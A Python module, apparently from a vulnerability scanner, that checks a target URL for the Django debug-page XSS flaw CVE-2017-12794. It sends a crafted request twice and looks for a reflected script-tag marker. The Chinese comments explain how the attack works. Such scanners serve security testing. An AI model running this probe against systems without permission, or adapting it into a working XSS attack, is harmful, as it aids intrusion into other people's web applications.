#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests

def cve_2017_12794_scan(self, url):
    '''Django debug page XSS漏洞
            构造url创建新用户, 同时拼接xss语句, 得到已创建的提示;
            此时再次访问该链接(即创建同一个xss用户), 将触发恶意代码
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'XSS'
    vul_info['vul_id'] = 'CVE-2017-12794'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers
    headers.update(vul_info['headers'])

    for payload in self.cve_2017_12794_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res1 = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res1.status_code, res1)                        # * LOG

            # * 该XSS漏洞较奇怪, 需要请求2次, 2次的payload必须一模一样
            res2 = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res2.status_code, res2)                        # * LOG


            # todo 判断
            if (("<ScRiPt>prompt('" + str(self.random_num) + "')") in res2.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
